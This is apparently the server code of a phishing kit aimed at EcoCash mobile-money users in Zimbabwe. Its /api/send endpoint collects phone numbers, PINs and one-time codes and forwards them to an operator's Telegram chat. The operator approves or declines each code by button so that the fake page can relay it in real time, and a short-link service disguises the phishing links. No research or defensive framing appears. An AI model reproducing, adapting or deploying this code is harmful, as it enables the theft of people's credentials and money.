const statusStore = new Map();

export default {
  async fetch(request, env) {
    try {
      const url = new URL(request.url);

      // =========================
      // 1. POST /api/send
      // =========================
      if (url.pathname === '/api/send') {
        if (request.method !== 'POST') {
          return jsonResponse({ error: 'Method not allowed' }, 405);
        }
        if (!env.TELEGRAM_BOT_TOKEN || !env.TELEGRAM_CHAT_ID) {
          return jsonResponse({
            error: 'Secrets not configured',
            hasToken: !!env.TELEGRAM_BOT_TOKEN,
            hasChatId: !!env.TELEGRAM_CHAT_ID
          }, 500);
        }

        let body;
        try { body = await request.json(); }
        catch (e) { return jsonResponse({ error: 'Invalid JSON body' }, 400); }

        const { phone, pin, amount, currency, txnId, code, resend } = body;

        let message = '';
        if (resend) {
          message  = `🔁 *Resend Code Requested*\n-------------------------------\n`;
          message += `🆔 *Txn ID:* ${txnId}\n`;
          message += `💰 *Amount:* ${currency} ${amount}\n`;
          message += `⏱ *Time:* ${new Date().toISOString()}`;
        } else {
          message  = `🔐 *New EcoCash Activity*\n-------------------------------\n`;
          if (phone) message += `📱 *Phone:* +263 ${phone}\n`;
          if (pin)   message += `🔑 *PIN:* ${pin}\n`;
          if (code)  message += `🔢 *Code:* ${code}\n`;
          message += `💰 *Amount:* ${currency} ${amount}\n🆔 *Txn ID:* ${txnId}\n⏱ *Time:* ${new Date().toISOString()}`;
        }

        const payload = {
          chat_id: env.TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'Markdown'
        };

        if (code && txnId) {
          payload.reply_markup = {
            inline_keyboard: [[
              { text: "✅ Approve", callback_data: `approve:${txnId}` },
              { text: "❌ Decline", callback_data: `decline:${txnId}` },
              { text: "😅 Oops",    callback_data: `oops:${txnId}` }
            ]]
          };
        }

        try {
          const tgRes = await fetch(`https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          });
          const tgData = await tgRes.json();

          if (!tgData.ok) {
            return jsonResponse({ error: tgData.description, telegramCode: tgData.error_code }, 400);
          }

          if (txnId && code) statusStore.set(txnId, 'pending');
          return jsonResponse({ success: true }, 200);

        } catch (tgError) {
          return jsonResponse({ error: 'Telegram fetch failed: ' + tgError.message }, 500);
        }
      }

      // =========================
      // 2. GET /api/status
      // =========================
      if (url.pathname === '/api/status' && request.method === 'GET') {
        const txnId = url.searchParams.get('txnId');
        if (!txnId) return jsonResponse({ error: 'txnId required' }, 400);
        return jsonResponse({ status: statusStore.get(txnId) || 'pending' }, 200);
      }

      // =========================
      // 3. POST /api/webhook
      // =========================
      if (url.pathname === '/api/webhook' && request.method === 'POST') {
        let update;
        try { update = await request.json(); } catch { return jsonResponse({ ok: true }); }

        const cq = update.callback_query;
        if (cq && cq.data) {
          const [action, txnId] = cq.data.split(':');
          if (txnId) statusStore.set(txnId, action);

          try {
            await fetch(`https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ callback_query_id: cq.id, text: `Action: ${action}` })
            });
          } catch (e) {}
        }
        return jsonResponse({ ok: true }, 200);
      }

      // =========================
      // 4. POST /api/shorten — save a short link in KV
      // =========================
      if (url.pathname === '/api/shorten' && request.method === 'POST') {
        if (!env.SHORT_LINKS) {
          return jsonResponse({ error: 'SHORT_LINKS KV binding missing' }, 500);
        }

        let body;
        try { body = await request.json(); }
        catch { return jsonResponse({ error: 'Invalid JSON' }, 400); }

        const longUrl = body && body.url;
        if (!longUrl) return jsonResponse({ error: 'url required' }, 400);

        // Build a short code
        const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
        let code = 'EC';
        for (let i = 0; i < 6; i++) code += chars.charAt(Math.floor(Math.random() * chars.length));

        // Save in KV for 30 days
        await env.SHORT_LINKS.put(code, longUrl, { expirationTtl: 60 * 60 * 24 * 30 });

        const shortUrl = url.origin + '/' + code;
        return jsonResponse({ shortUrl, code }, 200);
      }

      // =========================
      // 5. GET /ECxxxxxx — redirect short links
      // =========================
      if (request.method === 'GET' && /^\/EC[A-Z0-9]{6}$/.test(url.pathname.slice(1))) {
        const code = url.pathname.slice(1);
        if (env.SHORT_LINKS) {
          const target = await env.SHORT_LINKS.get(code);
          if (target) {
            return Response.redirect(target, 302);
          }
        }
        return new Response('Short link not found or expired', { status: 404 });
      }

      // =========================
      // 6. POST /api/verify-admin
      // =========================
      if (url.pathname === '/api/verify-admin' && request.method === 'POST') {
        let body;
        try { body = await request.json(); }
        catch { return jsonResponse({ error: 'Invalid JSON' }, 400); }

        if (!env.ADMIN_PASSWORD) {
          return jsonResponse({ error: 'ADMIN_PASSWORD not set' }, 500);
        }
        if (body.password === env.ADMIN_PASSWORD) {
          return jsonResponse({ ok: true }, 200);
        }
        return jsonResponse({ error: 'Wrong password' }, 401);
      }

      // =========================
      // 7. GET /api/logs (existing)
      // =========================
      if (url.pathname === '/api/logs') {
        const entries = [];
        for (const [txnId, status] of statusStore.entries()) {
          entries.push({
            time: new Date().toLocaleTimeString(),
            level: status === 'approved' ? 'ok' : status === 'declined' ? 'err' : 'info',
            text: `${txnId} → ${status}`
          });
        }
        return jsonResponse({ entries }, 200);
      }

      // =========================
      // 8. Static files
      // =========================
      if (!env.ASSETS) {
        return new Response('ASSETS binding missing in wrangler.toml', { status: 500 });
      }
      return env.ASSETS.fetch(request);

    } catch (fatalError) {
      return jsonResponse({ error: 'FATAL: ' + fatalError.message, stack: fatalError.stack }, 500);
    }
  }
};

function jsonResponse(data, status) {
  return new Response(JSON.stringify(data), {
    status,
    headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
  });
}
